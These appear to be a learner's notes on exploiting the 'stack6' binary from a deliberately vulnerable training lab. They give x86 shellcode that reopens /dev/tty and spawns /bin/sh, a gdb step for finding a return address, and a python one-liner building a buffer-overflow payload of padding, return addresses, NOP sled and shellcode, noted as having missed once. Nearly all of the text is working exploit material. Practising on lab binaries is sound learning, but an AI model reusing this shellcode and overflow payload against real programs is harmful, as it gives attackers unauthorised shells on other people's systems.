export SHELL_CODE="\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

gdb ./stack6
(gdb) disassemble getpath # get ret address for getpath 0x080484f9

# illegal instruction (missed)
python -c "print('a' * 80 + 'f9840408'.decode('hex') + '40f6ffbf'.decode('hex') + '\x90' * 300 + '$SHELL_CODE')" | ./stack6
